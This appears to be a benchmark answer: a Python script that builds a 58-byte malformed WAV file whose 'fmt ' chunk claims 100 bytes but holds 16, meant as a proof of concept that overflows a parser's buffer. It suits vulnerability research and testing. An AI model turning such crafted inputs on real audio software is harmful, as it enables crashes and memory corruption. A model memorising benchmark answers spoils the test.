import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal RIFF file with chunk size mismatch to trigger overflow
        # RIFF header: 'RIFF' (4 bytes) + file_size (4 bytes) + 'WAVE' (4 bytes)
        # Then a 'fmt ' chunk with incorrect size to cause overflow
        
        # File structure:
        # RIFF header: 12 bytes
        # 'fmt ' chunk header: 8 bytes
        # 'fmt ' data: 16 bytes (but we'll claim larger size)
        # 'data' chunk header: 8 bytes
        # 'data' content: minimal audio data
        
        # Total target: 58 bytes (ground truth)
        
        # Build RIFF header
        riff_header = b'RIFF'
        
        # Overall file size: 58 - 8 = 50 (minus 8 for 'RIFF' and size field)
        file_size = 50  # Little-endian
        riff_size = struct.pack('<I', file_size)
        wave_format = b'WAVE'
        
        # Build 'fmt ' chunk with incorrect size to trigger overflow
        fmt_chunk_id = b'fmt '
        fmt_chunk_size = 100  # Much larger than actual data, should cause overflow
        fmt_chunk_size_bytes = struct.pack('<I', fmt_chunk_size)
        
        # Minimal fmt chunk data (16 bytes for PCM)
        # We'll only provide 16 bytes but claim 100
        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 44100, 1, 8)  # PCM, mono, 44.1kHz, 8-bit
        
        # Build 'data' chunk
        data_chunk_id = b'data'
        data_chunk_size = 2  # Minimal audio data
        data_chunk_size_bytes = struct.pack('<I', data_chunk_size)
        data_content = b'\x00\x00'  # 2 bytes of silence
        
        # Assemble the file
        # Note: We're creating fmt chunk with declared size 100 but only providing 16 bytes
        # This should cause buffer overflow when reading chunk data
        poc = (riff_header + riff_size + wave_format +
               fmt_chunk_id + fmt_chunk_size_bytes + fmt_data[:16] +  # Only 16 bytes of fmt data
               data_chunk_id + data_chunk_size_bytes + data_content)
        
        # Pad to exactly 58 bytes if needed
        current_len = len(poc)
        if current_len < 58:
            # Add padding with zeros
            poc += b'\x00' * (58 - current_len)
        elif current_len > 58:
            # Trim if somehow longer (shouldn't happen)
            poc = poc[:58]
            
        return poc
